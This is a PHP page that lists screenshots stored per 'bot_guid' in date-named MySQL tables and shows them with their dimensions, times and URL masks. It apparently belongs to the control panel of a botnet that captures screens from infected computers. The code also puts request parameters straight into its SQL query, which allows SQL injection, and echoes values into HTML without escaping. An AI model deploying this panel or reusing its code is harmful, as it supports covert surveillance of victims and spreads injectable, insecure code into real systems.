<?php

$bot_guid = urldecode($_GET['bot_guid']);
if (@$bot_guid && $bot_guid) {
	$sqlp1 = " AND bot_guid LIKE '%$bot_guid%'";
}
$date = $_GET['dt'];
if (!@$date)
	exit;
$limit = $_GET['lm'];
if ((@$limit) && $limit) {
	$sqlp0 = " LIMIT $limit";
}

require_once 'mod_dbase.php';
require_once 'mod_strenc.php';
require_once 'mod_file.php';

$dbase = db_open();



$sql = "SELECT id, bot_guid, w, h, urlmask, date_rep, ticktime"
     . "  FROM scr_$date"
	 . " WHERE 1 = 1"
	 . $sqlp1
	 . " ORDER BY ticktime"
	 . $sqlp0;
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || !mysqli_num_rows($res)) {
	echo "No screenshots were found";
	exit;
}
$cnt = mysqli_num_rows($res);
echo "<table width='720px' cellspacing='0' cellpadding='3'>\n";
$wdisp = 0;
while ( list($id, $bot_guid, $w, $h, $urlmask, $date_rep, $ticktime) = mysqli_fetch_row($res) ) {

echo "<tr>\n";
echo "<td valign='top' align='center'>\n";

	$hour = intval($ticktime / (60 * 60 * 1000));
	$msech = intval($hour * (60 * 60 * 1000));
	$min = intval(($ticktime - $msech) / (60 * 1000));
	$msecm = intval($msech + ($min * (60 * 1000)));
	$sec = intval(($ticktime - $msecm) / 1000);

	$wdisp += $w;
	if ($w > 700) {
		$k = (700 / $w);
		$w = 700;
		$h = intval($h * $k);
	}
	/*if ($wdisp > 700) {
		echo "\n</td>";
		echo "\n</tr>";
		echo "\n<tr>";
		echo "\n<td>\n";
		$wdisp = $w;
	}*/
	
	echo "<table width='$w' cellspacing='0' cellpadding='0' border='1' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: rgb(240, 240, 240);'>\n";
	echo "<tr><td align='center' style='background-color: rgb(32, 32, 32); color: rgb(240, 240, 240);'><b>$bot_guid</b></td></tr>\n";
	$r = rand();
	echo "<tr><td align='center'><img src='frm_showimg.php?dt=$date&id=$id&r=$r' width='$w' height='$h' title='$hour:$min:$sec'><br>$w <b>x</b> $h</td></tr>\n";
	echo "<tr><td align='center'><a href='#null'>$urlmask</a></td></tr>\n";
	echo "</table>\n\n";
	//echo "<img src='frm_showimg.php?dt=$date&id=$id' width='$w' height='$h' title='$hour:$min:$sec'>";

echo "</td>\n";
echo "</tr>\n";

}
echo "</table>\n";

db_close($dbase);

?>